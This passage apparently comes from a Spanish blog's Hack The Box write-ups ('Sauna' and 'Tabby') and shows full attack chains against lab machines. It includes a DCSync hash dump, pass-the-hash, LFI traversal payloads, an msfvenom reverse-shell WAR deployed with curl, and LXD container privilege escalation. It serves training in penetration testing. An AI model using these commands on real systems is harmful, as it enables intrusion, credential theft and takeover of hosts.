fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tWinsock2\\CatalogChangeListener-260-1 fr--r--r-- 3 Sun Dec 31 17:57:56 1600\tRpcProxy\\49670 fr--r--r-- 3 Sun Dec 31 17:57:56 1600\tb75206e9c2133cf5 fr--r--r-- 3 Sun Dec 31 17:57:56 1600\tRpcProxy\\593 fr--r--r-- 4 Sun Dec 31 17:57:56 1600\tsrvsvc fr--r--r-- 3 Sun Dec 31 17:57:56 1600\tspoolss fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tWinsock2\\CatalogChangeListener-b94-0 fr--r--r-- 3 Sun Dec 31 17:57:56 1600\tnetdfs fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tvgauth-service fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tWinsock2\\CatalogChangeListener-250-0 fr--r--r-- 3 Sun Dec 31 17:57:56 1600\tROUTER fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tWinsock2\\CatalogChangeListener-8f4-0 fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tWinsock2\\CatalogChangeListener-7d4-0 fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tPIPE_EVENTROOT\\CIMV2SCM EVENT PROVIDER fr--r--r-- 3 Sun Dec 31 17:57:56 1600\tW32TIME_ALT fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tPSHost.132272457929604436.3680.DefaultAppDomain.wsmprovhost fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tiisipm8edc73b6-375e-4404-816c-f06e9ca4e3d2 fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tiislogpipe5ec33ab0-ed89-4506-a437-f8c09f25dfcb fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tPSHost.132272481319626253.3316.DefaultAppDomain.wsmprovhost fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tPSHost.132272541365899156.5756.DefaultAppDomain.wsmprovhost fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tPSHost.132272546170148799.3268.DefaultAppDomain.wsmprovhost fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tPSHost.132272548732993844.5392.DefaultAppDomain.wsmprovhost fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tPSHost.132272549933510639.4140.DefaultAppDomain.wsmprovhost fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tPSHost.132272556670204143.3228.DefaultAppDomain.wsmprovhost fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tPSHost.132272557556503609.1872.DefaultAppDomain.wsmprovhost IPC$ READ ONLY\tRemote IPC . dr--r--r-- 0 Wed Jan 22 23:44:49 2020\t. dr--r--r-- 0 Wed Jan 22 23:44:49 2020\t.. NETLOGON READ ONLY\tLogon server share . dr--r--r-- 0 Wed Jan 22 23:32:39 2020\t. dr--r--r-- 0 Wed Jan 22 23:32:39 2020\t.. dr--r--r-- 0 Wed Jan 22 23:29:26 2020\tcolor dr--r--r-- 0 Wed Jan 22 23:32:39 2020\tIA64 dr--r--r-- 0 Thu Jan 23 17:10:43 2020\tW32X86 dr--r--r-- 0 Thu Jan 23 17:10:42 2020\tx64 print$ READ ONLY\tPrinter Drivers RICOH Aficio SP 8300DN PCL 6 NO ACCESS\tWe cant print money . dr--r--r-- 0 Wed Jan 22 23:44:49 2020\t. dr--r--r-- 0 Wed Jan 22 23:44:49 2020\t.. dr--r--r-- 0 Wed Jan 22 23:44:49 2020\tEGOTISTICAL-BANK.LOCAL SYSVOL READ ONLY\tLogon server share root@aoiri:~/htb/sauna#   Vemos que tiene permisos de solo lectura en IPC$, NETLOGON, print$ y SYSVOL.\nEVIL-WINRM Ya que esta abierto el puerto 5985 de winrm utilizamos las credenciales y evilwinrm para obtener una shell y con ello nuestra flag user.txt.\nUSER - svc_loanmgr Hacemos una enumeracion para buscar contraseñas utilizando querys en el registro de windows con comandos de PayloadsAlltheThings.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59  *Evil-WinRM* PS C:\\Users\\FSmith\\Documents\u0026gt; reg query \u0026#34;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon\u0026#34; HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon AutoRestartShell REG_DWORD 0x1 Background REG_SZ 0 0 0 CachedLogonsCount REG_SZ 10 DebugServerCommand REG_SZ no DefaultDomainName REG_SZ EGOTISTICALBANK DefaultUserName REG_SZ EGOTISTICALBANK\\svc_loanmanager DisableBackButton REG_DWORD 0x1 EnableSIHostIntegration REG_DWORD 0x1 ForceUnlockLogon REG_DWORD 0x0 LegalNoticeCaption REG_SZ LegalNoticeText REG_SZ PasswordExpiryWarning REG_DWORD 0x5 PowerdownAfterShutdown REG_SZ 0 PreCreateKnownFolders REG_SZ {A520A1A4-1780-4FF6-BD18-167343C5AF16} ReportBootOk REG_SZ 1 Shell REG_SZ explorer.exe ShellCritical REG_DWORD 0x0 ShellInfrastructure REG_SZ sihost.exe SiHostCritical REG_DWORD 0x0 SiHostReadyTimeOut REG_DWORD 0x0 SiHostRestartCountLimit REG_DWORD 0x0 SiHostRestartTimeGap REG_DWORD 0x0 Userinit REG_SZ C:\\Windows\\system32\\userinit.exe, VMApplet REG_SZ SystemPropertiesPerformance.exe /pagefile WinStationsDisabled REG_SZ 0 scremoveoption REG_SZ 0 DisableCAD REG_DWORD 0x1 LastLogOffEndTimePerfCounter REG_QWORD 0x8e3982368 ShutdownFlags REG_DWORD 0x80000027 DisableLockWorkstation REG_DWORD 0x0 DefaultPassword REG_SZ Moneymakestheworldgoround! HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon\\AlternateShells HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon\\GPExtensions HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon\\UserDefaults HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon\\AutoLogonChecked HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon\\VolatileUserMgrKey *Evil-WinRM* PS C:\\Users\\FSmith\\Documents\u0026gt; Encontramos una contraseña del usuario svc_loanmanager: DefaultUserName REG_SZ EGOTISTICALBANK\\svc_loanmanager DefaultPassword REG_SZ Moneymakestheworldgoround! Los usuarios registrados en la maquina aparece svc_loanmgr como usuario, pero en el query aparece svc_loanmanager por lo que suponemos que la contraseña pertenece a svc_loanmgr: *Evil-WinRM* PS C:\\Users\\FSmith\\Documents\u0026gt; net users User accounts for \\\\ ------------------------------------------------------------------------------- Administrator FSmith Guest HSmith krbtgt svc_loanmgr The command completed with one or more errors. *Evil-WinRM* PS C:\\Users\\FSmith\\Documents\u0026gt;   Utilizamos EvilWinrm con las credenciales de svc_loanmgr:\nPRIVILEGE ESCALATION Utilizamos Bloodhound.py para obtener informacion con el usuario svc_loanmgr importamos los datos a bloodhound, luego de esto utilizamos Aclpwn.py para poder encontrar una ruta para obtener privilegios de administrador de la misma forma que la maquina Forest de HackTheBox.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  root@aoiri:~/tools/BloodHound.py/sauna# python ../bloodhound -u svc_loanmgr -p \u0026#39;Moneymakestheworldgoround!\u0026#39; -d EGOTISTICAL-BANK.LOCAL -ns 10.10.10.175 -c all INFO: Found AD domain: egotistical-bank.local INFO: Connecting to LDAP server: SAUNA.EGOTISTICAL-BANK.LOCAL INFO: Found 1 domains INFO: Found 1 domains in the forest INFO: Found 1 computers INFO: Connecting to LDAP server: SAUNA.EGOTISTICAL-BANK.LOCAL INFO: Found 6 users INFO: Connecting to GC LDAP server: SAUNA.EGOTISTICAL-BANK.LOCAL INFO: Found 51 groups INFO: Found 0 trusts INFO: Starting computer enumeration with 10 workers INFO: Querying computer: SAUNA.EGOTISTICAL-BANK.LOCAL INFO: Done in 01M 15S root@aoiri:~/tools/BloodHound.py/sauna# zip -r sauna.zip *.json updating: computers.json (deflated 75%) updating: domains.json (deflated 85%) updating: groups.json (deflated 95%) updating: users.json (deflated 92%) root@aoiri:~/tools/BloodHound.py/sauna#   Bloodhound 1 2 3 4 5 6 7  root@aoiri:~/tools/aclpwn.py# python aclpwn.py -f svc_loanmgr -p \u0026#39;Moneymakestheworldgoround!\u0026#39; -ft user -t EGOTISTICAL-BANK.LOCAL -tt domain -d EGOTISTICAL-BANK.LOCAL -du neo4j -dp root -s 10.10.10.175 Please supply the password or LM:NTLM hashes of the account you are escalating from: [+] Path found! Path: (SVC_LOANMGR@EGOTISTICAL-BANK.LOCAL)-[GetChangesAll]-\u0026gt;(EGOTISTICAL-BANK.LOCAL) [-] DCSync -\u0026gt; continue [+] Finished running tasks root@aoiri:~/tools/aclpwn.py#   En la ejecucion de Aclpwn nos aparece que el usuario svc_loanmgr ya tiene permisos para ejecutar DCSync. Sabiendo esto, utilizamos secretsdump.py de impacket para obtener los hashes de los usuarios registrados en la maquina.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33  root@aoiri:~/tools/impacket/examples# python secretsdump.py svc_loanmgr:\u0026#39;Moneymakestheworldgoround!\u0026#39;@10.10.10.175 Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied [*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash) [*] Using the DRSUAPI method to get NTDS.DIT secrets Administrator:500:aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c::: EGOTISTICAL-BANK.LOCAL\\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd::: EGOTISTICAL-BANK.LOCAL\\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd::: EGOTISTICAL-BANK.LOCAL\\svc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c::: SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:ba6af99033d007cdc1a1fbff2af7c4e7::: [*] Kerberos keys grabbed Administrator:aes256-cts-hmac-sha1-96:987e26bb845e57df4c7301753f6cb53fcf993e1af692d08fd07de74f041bf031 Administrator:aes128-cts-hmac-sha1-96:145e4d0e4a6600b7ec0ece74997651d0 Administrator:des-cbc-md5:19d5f15d689b1ce5 krbtgt:aes256-cts-hmac-sha1-96:83c18194bf8bd3949d4d0d94584b868b9d5f2a54d3d6f3012fe0921585519f24 krbtgt:aes128-cts-hmac-sha1-96:c824894df4c4c621394c079b42032fa9 krbtgt:des-cbc-md5:c170d5dc3edfc1d9 EGOTISTICAL-BANK.LOCAL\\HSmith:aes256-cts-hmac-sha1-96:5875ff00ac5e82869de5143417dc51e2a7acefae665f50ed840a112f15963324 EGOTISTICAL-BANK.LOCAL\\HSmith:aes128-cts-hmac-sha1-96:909929b037d273e6a8828c362faa59e9 EGOTISTICAL-BANK.LOCAL\\HSmith:des-cbc-md5:1c73b99168d3f8c7 EGOTISTICAL-BANK.LOCAL\\FSmith:aes256-cts-hmac-sha1-96:8bb69cf20ac8e4dddb4b8065d6d622ec805848922026586878422af67ebd61e2 EGOTISTICAL-BANK.LOCAL\\FSmith:aes128-cts-hmac-sha1-96:6c6b07440ed43f8d15e671846d5b843b EGOTISTICAL-BANK.LOCAL\\FSmith:des-cbc-md5:b50e02ab0d85f76b EGOTISTICAL-BANK.LOCAL\\svc_loanmgr:aes256-cts-hmac-sha1-96:6f7fd4e71acd990a534bf98df1cb8be43cb476b00a8b4495e2538cff2efaacba EGOTISTICAL-BANK.LOCAL\\svc_loanmgr:aes128-cts-hmac-sha1-96:8ea32a31a1e22cb272870d79ca6d972c EGOTISTICAL-BANK.LOCAL\\svc_loanmgr:des-cbc-md5:2a896d16c28cf4a2 SAUNA$:aes256-cts-hmac-sha1-96:69c8e51b35b01f1a8ab165234d674ab739770549b8741e176f51a75780a8bfe2 SAUNA$:aes128-cts-hmac-sha1-96:8d7e85b92a9930e14eb79b15519775a1 SAUNA$:des-cbc-md5:fea201988a20bf46 [*] Cleaning up...   Psexec.py Logramos obtener los hashes del usuario Administrator, utilizamos psexec.py con los hashes que encontramos para obtener una shell y nuestra flag root.txt.\n","description":"Sauna una maquina de HackTheBox, encontramos usuarios los cuales utilizamos para crear un wordlist personalizado y realizar ASREPRoast con Impacket lo que nos dio acceso por WinRM. Accedimos a un segundo usuario con una contraseña que encontramos en el registro de windows. Finalmente enumeramos con BloodHound y con la informacion recolectada obtuvimos acceso con ACLPwn para luego realizar Pass-the-Hash y obtener acceso privilegiado con PSExec.","id":35,"section":"posts","tags":["smbclient","evil-winrm","bloodhound","aclpwn","impacket"],"title":"Hack The Box - Sauna","uri":"https://sckull.github.io/posts/sauna/"},{"content":"  En Tabby descubrimos una vulnerabilidad LFI y, que con DotDotPwn logramos obtener la direccion o payload para leer documentos lo que nos llevo a leer las credenciales de Tomcat, con este ultimo logramos subir un Payload para obtener una shell inversa utilizando Curl. Crackeamos con Fcrackzip un archiv zip lo que nos dio acceso a un segundo usuario. Escalamos privilegios creando un contenedor privilegiado utilizando LXC.\nInformacion de la Maquina    Nombre Tabby      OS Linux   Puntos 20   Dificultad Facil   IP 10.10.10.194   Maker egre55    Matrix   { \u0026quot;type\u0026quot;:\u0026quot;radar\u0026quot;, \u0026quot;data\u0026quot;:{ \u0026quot;labels\u0026quot;:[\u0026quot;Enumeration\u0026quot;,\u0026quot;Real-Life\u0026quot;,\u0026quot;CVE\u0026quot;,\u0026quot;Custom Explotation\u0026quot;,\u0026quot;CTF-Like\u0026quot;], \u0026quot;datasets\u0026quot;:[ { \u0026quot;label\u0026quot;:\u0026quot;User Rate\u0026quot;, \u0026quot;data\u0026quot;:[6.9, 6.5, 6.4, 3.6, 3.5], \u0026quot;backgroundColor\u0026quot;:\u0026quot;rgba(75, 162, 189,0.5)\u0026quot;, \u0026quot;borderColor\u0026quot;:\u0026quot;#4ba2bd\u0026quot; }, { \u0026quot;label\u0026quot;:\u0026quot;Maker Rate\u0026quot;, \u0026quot;data\u0026quot;:[8, 9, 9, 1, 1], \u0026quot;backgroundColor\u0026quot;:\u0026quot;rgba(154, 204, 20,0.5)\u0026quot;, \u0026quot;borderColor\u0026quot;:\u0026quot;#9acc14\u0026quot; } ] }, \u0026quot;options\u0026quot;: {\u0026quot;scale\u0026quot;: {\u0026quot;ticks\u0026quot;: {\u0026quot;backdropColor\u0026quot;:\u0026quot;rgba(0,0,0,0)\u0026quot;}, \u0026quot;angleLines\u0026quot;:{\u0026quot;color\u0026quot;:\u0026quot;rgba(255, 255, 255,0.6)\u0026quot;}, \u0026quot;gridLines\u0026quot;:{\u0026quot;color\u0026quot;:\u0026quot;rgba(255, 255, 255,0.6)\u0026quot;} } } }     NMAP Escaneo de puertos tcp, nmap nos muestra el puerto http tomcat (8080), http (80) y el puerto ssh (22) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28  # Nmap 7.80 scan initiated Thu Sep 24 01:03:09 2020 as: nmap -p- --min-rate 1000 -o allports 10.10.10.194 Warning: 10.10.10.194 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.10.194 (10.10.10.194) Host is up (0.13s latency). Not shown: 64652 closed ports, 880 filtered ports PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 8080/tcp open http-proxy # Nmap done at Thu Sep 24 01:05:44 2020 -- 1 IP address (1 host up) scanned in 154.47 seconds # Nmap 7.80 scan initiated Thu Sep 24 01:06:26 2020 as: nmap -p22,80,8080 -sC -sV -o serviceports 10.10.10.194 Nmap scan report for 10.10.10.194 (10.10.10.194) Host is up (0.068s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Mega Hosting 8080/tcp open http Apache Tomcat |_http-open-proxy: Proxy might be redirecting requests |_http-title: Apache Tomcat Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Thu Sep 24 01:06:41 2020 -- 1 IP address (1 host up) scanned in 15.55 seconds   HTTP Encontramos una pagina web en el puerto 80 que ofrece servicios de hosting.\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos.\n1 2 3 4 5 6 7 8 9  kali@kali:~/htb/tabby$ gobuster dir -u http://10.10.10.194/ -w /usr/share/wordlists/dirb/common.txt -q -t 25 -x php,html,txt /assets (Status: 301) /favicon.ico (Status: 200) /files (Status: 301) /index.php (Status: 200) /index.php (Status: 200) /news.php (Status: 200) /Readme.txt (Status: 200) /server-status (Status: 403)   Las direcciones que encontramos no tienen algo que nos pudiera ayudar pero, al revisar el codigo fuente de la pagina principal vemos que el boton News en el nav, nos redirige hacia otra pagina con el dominio megahosting.htb el cual agregamos a nuestro archivo /etc/hosts a la IP de la maquina. Regresamos nuevamente a la pagina y vemos que la URL se le pasa un archivo (?file=statement), posiblemente tenga una vulnerabilidad de LFI.\nDOTDOTPWN - LFI Utilizamos la herramienta dotdotpwn la cual nos ayudo a identificar la vulnerabilidad LFI en la pagina.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60  kali@kali:~/htb/tabby$ dotdotpwn -m http-url -u http://megahosting.htb/news.php?file=TRAVERSAL -k \u0026#34;root:\u0026#34; -t .2 -q ################################################################################# # # # CubilFelino Chatsubo # # Security Research Lab and [(in)Security Dark] Labs # # chr1x.sectester.net chatsubo-labs.blogspot.com # # # # pr0udly present: # # # # ________ __ ________ __ __________ # # \\______ \\ ____ _/ |_\\______ \\ ____ _/ |_\\______ \\__ _ __ ____ # # | | \\ / _ \\\\ __\\| | \\ / _ \\\\ __\\| ___/\\ \\/ \\/ // \\ # # | ` \\( \u0026lt;_\u0026gt; )| | | ` \\( \u0026lt;_\u0026gt; )| | | | \\ /| | \\ # # /_______ / \\____/ |__| /_______ / \\____/ |__| |____| \\/\\_/ |___| / # # \\/ \\/ \\/ # # - DotDotPwn v3.0.2 - # # The Directory Traversal Fuzzer # # http://dotdotpwn.sectester.net # # dotdotpwn@sectester.net # # # # by chr1x \u0026amp; nitr0us # ################################################################################# [+] Report name: Reports/megahosting.htb_09-24-2020_01-28.txt [========== TARGET INFORMATION ==========] [+] Hostname: megahosting.htb [+] Protocol: http [+] Port: 80 [=========== TRAVERSAL ENGINE ===========] [+] Creating Traversal patterns (mix of dots and slashes) [+] Multiplying 6 times the traversal patterns (-d switch) [+] Creating the Special Traversal patterns [+] Translating (back)slashes in the filenames [+] Adapting the filenames according to the OS type detected (unix) [+] Including Special sufixes [+] Traversal Engine DONE ! - Total traversal tests created: 11028 [=========== TESTING RESULTS ============] [+] Ready to launch 5000.00 traversals per second [+] Press Enter to start the testing (You can stop it pressing Ctrl + C) [+] Replacing \u0026#34;TRAVERSAL\u0026#34; with the traversals created and sending . [*] Testing URL: http://megahosting.htb/news.php?file=../../../../etc/passwd \u0026lt;- VULNERABLE [*] Testing URL: http://megahosting.htb/news.php?file=../../../../../etc/passwd \u0026lt;- VULNERABLE [*] Testing URL: http://megahosting.htb/news.php?file=../../../../../../etc/passwd \u0026lt;- VULNERABLE . . [*] Testing URL: http://megahosting.htb/news.php?file=..%2f..%2f..%2f..%2fetc%2fpasswd \u0026lt;- VULNERABLE [*] Testing URL: http://megahosting.htb/news.php?file=..%2f..%2f..%2f..%2f..%2fetc%2fpasswd \u0026lt;- VULNERABLE [*] Testing URL: http://megahosting.htb/news.php?file=..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd \u0026lt;- VULNERABLE . ^C [+] Total Traversals found: 6 [-] Fuzz testing aborted [+] Report saved: Reports/megahosting.htb_09-24-2020_01-28.txt   Vemos la lista de usuarios que podriamos utilizar posteriormente.\nAdemás de ello logramos obtener el codigo fuente de la pagina vulnerable:\n1 2 3 4 5 6 7 8  \u0026lt;?php $file = $_GET[\u0026#39;file\u0026#39;]; $fh = fopen(\u0026#34;files/$file\u0026#34;,\u0026#34;r\u0026#34;); while ($line = fgets($fh)) { echo($line); } fclose($fh); ?\u0026gt;   Realizamos una busqueda de archivos conocidos de linux por posibles contraseñas o configuraciones para ingresar pero no encontramos nada.\nHTTP - PUERTO 8080 Encontramos una pagina web en el puerto 8080 en Apache Tomcat, donde vemos un mensaje que indica que Tomcat se instalo satisfactoriamente y muestran algunas direcciones de la maquina, pero lo interesante es la nota que dejan.\nIndica que los usuarios estan \u0026ldquo;definidos\u0026rdquo; en la direccion /etc/tomcat9/tomcat-users.xml.\n1  NOTE: For security reasons, using the manager webapp is restricted to users with role \u0026#34;manager-gui\u0026#34;. The host-manager webapp is restricted to users with role \u0026#34;admin-gui\u0026#34;. Users are defined in /etc/tomcat9/tomcat-users.xml.   Y tambien algunas variables que son necesarias para tomcat, como CATALINA_HOME y CATALINA_BASE:\n1  Tomcat veterans might be pleased to learn that this system instance of Tomcat is installed with CATALINA_HOME in /usr/share/tomcat9 and CATALINA_BASE in /var/lib/tomcat9, following the rules from /usr/share/doc/tomcat9-common/RUNNING.txt.gz.   Al utilizar tal direccion en la pagina con vulnerabilidad LFI no resulto, aunque el archivo RUNNING.txt.gz es posible obtenerlo pero no de forma completa. Por lo que instalamos tomcat9 en nuestra maquina para verificar que archivos son los que se pueden encontrar en tales carpetas. Vemos que existen algunos archivos dentro de la carpeta /usr/share/tomcat9/ en los cuales al pasarlo en la pagina vulnerable podemos leerlo, incluyendo el archivo tomcat-users.xml.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  kali@kali:~/htb/tabby$ tree /usr/share/tomcat9/ /usr/share/tomcat9/ ├── bin │ ├── bootstrap.jar │ │ [... REDACTED ...] ├── default.template ├── etc │ ├── catalina.properties │ ├── context.xml │ ├── jaspic-providers.xml │ ├── logging.properties │ ├── server.xml │ ├── tomcat-users.xml │ └── web.xml ├── lib │ ├── annotations-api.jar -\u0026gt; ../../java/tomcat9-annotations-api.jar │ [... REDACTED ...] └── logrotate.template 3 directories, 48 files   Encontramos un usuario y contraseña en http://megahosting.htb/news.php?file=../../../../usr/share/tomcat9/etc/tomcat-users.xml el cual tiene los roles admin-gui y manager-script:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; [... REDACTED ...] \u0026lt;tomcat-users xmlns=\u0026#34;http://tomcat.apache.org/xml\u0026#34; xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xsi:schemaLocation=\u0026#34;http://tomcat.apache.org/xml tomcat-users.xsd\u0026#34; version=\u0026#34;1.0\u0026#34;\u0026gt; [... REDACTED ...] \u0026lt;role rolename=\u0026#34;admin-gui\u0026#34;/\u0026gt; \u0026lt;role rolename=\u0026#34;manager-script\u0026#34;/\u0026gt; \u0026lt;user username=\u0026#34;tomcat\u0026#34; password=\u0026#34;$3cureP4s5w0rd123!\u0026#34; roles=\u0026#34;admin-gui,manager-script\u0026#34;/\u0026gt; \u0026lt;/tomcat-users\u0026gt;   Intentamos ingresar con las credenciales al panel pero recordemos que en el mensaje del index indica que los usuarios con roles admin-gui no tienen acceso al panel de /manager\nIntentamos en /host-manager/html donde logramos ingresar, mas no logramos hacer nada.\nTOMCAT - USER Intentamos utilizar el exploit tomcat_mgr_upload de metasploit pero este mostraba errores ya que la pagina /manager esta \u0026ldquo;desactivada\u0026rdquo;, exploramos otras opciones y encontramos Tomcat exploit variant : host-manager pero este solo funciona en maquinas Windows. Investigamos un poco sobre como se sube estos archivos (.war) y encontramos que es posible subir estos mediante curl utilizando las credenciales y un archivo .war sin necesidad de acceder al GUI de la aplicacion.\nPara ello vamos a tener que crear un payload como en la maquina THM/BSIDESGT - THOMPSON y poner a la escucha metasploit:\n1  msfvenom -p java/jsp_shell_reverse_tcp LHOST=tun0 LPORT=1338 -f war \u0026gt; batman.war   Y realizamos el deploy de nuestro archivo:\n1  curl --upload-file batman.war --user \u0026#39;tomcat:$3cureP4s5w0rd123!\u0026#39; \u0026#34;http://10.10.10.194:8080/manager/text/deploy?path=/batman\u0026amp;update=True\u0026#34;   Ponemos a la escucha metasploit o netcat en el puerto indicado en el payload y ejecutamos nuestra \u0026ldquo;applicacion\u0026rdquo; o batman.war visitando la siguiente url:\n1  curl --user \u0026#39;tomcat:$3cureP4s5w0rd123!\u0026#39; http://10.10.10.194:8080/batman   Logramos obtener una shell con usuario tomcat.\nASH - USER En el directorio /var/www/html/files encontramos un archivo zip el cual esta protegido con contraseña, utilizamos fcrackzip para obtener la contraseña y el contenido de este archivo.\n1 2 3 4 5 6 7 8 9 10  tomcat@tabby:/var/www/html/files$ ls -lah ls -lah total 36K drwxr-xr-x 4 ash ash 4.0K Jun 17 21:59 . drwxr-xr-x 4 root root 4.0K Jun 17 16:24 .. -rw-r--r-- 1 ash ash 8.6K Jun 16 13:42 16162020_backup.zip drwxr-xr-x 2 root root 4.0K Jun 16 20:13 archive drwxr-xr-x 2 root root 4.0K Jun 16 20:13 revoked_certs -rw-r--r-- 1 root root 6.4K Jun 16 11:25 statement tomcat@tabby:/var/www/html/files$   Aunque encontramos la contraseña, al descomprimir el archivo no logramos leer alguna credencial dentro de los archivos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  kali@kali:~/htb/tabby$ fcrackzip -D -u -p /usr/share/wordlists/rockyou.txt 16162020_backup.zip PASSWORD FOUND!!!!: pw == admin@it kali@kali:~/htb/tabby$ tree var/ var/ └── www └── html ├── assets ├── favicon.ico ├── files ├── index.php ├── logo.png ├── news.php └── Readme.txt 4 directories, 5 files kali@kali:~/htb/tabby$   Utilizamos la contraseña del archivo comprimido que encontramos con el usuario ash en la maquina y logramos obtener una shell con este usuario y nuestra flag user.txt.\nPRIVILEGE ESCALATION Hacemos una pequeña enumeracion con id y vemos que el usuario pertenece al grupo de lxd.\n1 2 3 4  ash@tabby:~$ id id uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd) ash@tabby:~$   Ya que este usuario pertenece a este grupo (lxd) vamos a escalar privilegios a traves de este al igual que en las maquinas presentadas en THM - LXD.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  #LOCAL git clone https://github.com/saghul/lxd-alpine-builder.git cd lxd-alpine-builder ./build-alpine -a i686 #MACHINE lxc image import ./alpine-v3.12-i686-20200924_0424.tar.gz --alias myimage lxc image list #Si no funcionan los comandos --\u0026gt; lxd init lxc init myimage sckull -c security.privileged=true lxc config device add sckull mydevice disk source=/ path=/mnt/root recursive=true lxc start sckull lxc exec sckull /bin/sh   Logramos obtener una shell root y nuestra flag root.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25  ash@tabby:~$ lxc image import ./alpine-v3.12-i686-20200924_0424.tar.gz --alias myimage \u0026lt;ine-v3.12-i686-20200924_0424.tar.gz --alias myimage If this is your first time running LXD on this machine, you should also run: lxd init To start your first instance, try: lxc launch ubuntu:18.04 ash@tabby:~$ lxc image list lxc image list +---------+--------------+--------+-------------------------------+--------------+-----------+--------+------------------------------+ | ALIAS | FINGERPRINT | PUBLIC | DESCRIPTION | ARCHITECTURE | TYPE | SIZE | UPLOAD DATE | +---------+--------------+--------+-------------------------------+--------------+-----------+--------+------------------------------+ | myimage | 850be888e99a | no | alpine v3.12 (20200924_04:24) | i686 | CONTAINER | 3.07MB | Sep 24, 2020 at 8:40am (UTC) | +---------+--------------+--------+-------------------------------+--------------+-----------+--------+------------------------------+ ash@tabby:~$ lxc init myimage sckull -c security.privileged=true lxc init myimage sckull -c security.privileged=true Creating sckull ash@tabby:~$ lxc config device add sckull mydevice disk source=/ path=/mnt/root recursive=true \u0026lt;ydevice disk source=/ path=/mnt/root recursive=true Device mydevice added to sckull ash@tabby:~$ lxc start sckull lxc start sckull ash@tabby:~$ lxc exec sckull /bin/sh lxc exec sckull /bin/sh ~ # whoami whoami root    Docs - Deploy War by URL  ","description":"En Tabby descubrimos una vulnerabilidad LFI y, que con DotDotPwn logramos obtener la direccion o payload para leer documentos lo que nos llevo a leer las credenciales de Tomcat, con este ultimo logramos subir un Payload para obtener una shell inversa utilizando Curl. Crackeamos con Fcrackzip un archiv zip lo que nos dio acceso a un segundo usuario. Escalamos privilegios creando un contenedor privilegiado utilizando LXC.","id":36,"section":"posts","tags":["lfi","dotdotpwn","tomcat","msfvenom","fcrackzip","lxc"],"title":"Hack The Box - Tabby","uri":"https://sckull.github.io/posts/tabby/"},{"content":"  Aster es una maquina de TryHackMe, realizamos un ataque de fuerza bruta al login de Asterisk seguidamente obtuvimos credenciales que nos dieron acceso a la maquina. 